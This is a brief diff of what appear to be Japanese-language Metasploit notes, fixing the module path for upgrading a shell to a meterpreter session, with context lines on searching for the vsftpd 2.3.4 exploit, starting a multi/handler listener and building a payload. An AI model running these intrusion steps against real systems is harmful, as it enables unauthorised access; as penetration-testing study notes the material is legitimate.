@@ -10,7 +10,7 @@ search vsftpd 2.3.4
 use exploit/multi/handrer
 
 //meterpreterで張替え
-use multi/manage/shell_to_meterpreter #最初のシェルをバックグラウンドにしてから
+use post/multi/manage/shell_to_meterpreter #最初のシェルをバックグラウンドにしてから
 run session=<num>
 
 //送信用ペイロード作成
